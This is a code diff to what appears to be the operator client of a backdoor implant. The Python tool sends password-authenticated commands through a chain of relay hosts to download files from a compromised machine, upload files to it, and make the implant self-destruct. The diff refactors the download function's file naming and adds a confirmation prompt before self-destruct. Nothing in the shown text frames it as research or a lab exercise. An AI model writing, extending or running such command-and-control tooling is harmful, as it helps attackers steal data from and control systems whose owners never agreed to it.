@@ -168,14 +168,12 @@ def sendrecv_encapsulate(host_list: list[tuple[str, int]], original_packet: Pack
     return decap_packet_res
 
 
-def download(host_list: list[tuple[str, int]], password: bytes, filename: str):
-    filename += "\x00"
-
-    packet = PacketReq(password, CMD_FILE_READ, filename.encode())
+def download(host_list: list[tuple[str, int]], password: bytes, filename_remote: str, filename_local: str):
+    packet_filename = filename_remote.encode() + b"\x00"
+    packet = PacketReq(password, CMD_FILE_READ, packet_filename)
     rsp = sendrecv_encapsulate(host_list, packet)
 
-    filename_flat = filename.replace("/", "__")
-    with open(filename_flat, "wb") as f:
+    with open(filename_local, "wb") as f:
         f.write(rsp.content)
 
     return rsp
@@ -242,12 +240,14 @@ def main(argv):
                 print("usage: download <remote_path>\n")
                 continue
 
-            rsp = download(host_list, password, cmd_argv[1])
+            filename_remote = cmd_argv[1]
+            filename_local = cmd_argv[1].replace("/", "__")
+            rsp = download(host_list, password, filename_remote, filename_local)
             if rsp.retv < 0:
-                print(f"[-] failed to download file '{cmd_argv[1]}' from server to local\n")
+                print(f"[-] failed to download file '{filename_remote}' from server to local\n")
                 continue
 
-            print(f"[+] file successfully downloaded '{cmd_argv[1]}' from server to local (saved with flat filename in pwd)\n")
+            print(f"[+] file successfully downloaded '{filename_remote}' from server to local (saved as '{filename_local}')\n")
         elif cmd_bin == "upload":
             if len(cmd_argv) != 3:
                 print("usage: upload <local_path> <remote_path>\n")
@@ -290,6 +290,10 @@ def main(argv):
                 host_list.pop(-1)
                 print(f"[+] successfully popped host {ip}:{port}\n")
         elif cmd_bin == "[self-destruct]":
+            confirm = input("[?] are you sure you want to permantently remove the implant from the system? (y/N): \n")
+            if confirm.lower() != "y":
+                continue
+
             server_exit(host_list, password)
             print(f"[+] successfully self destructed server {host_list[-1]}\n")
             host_list.pop(-1)
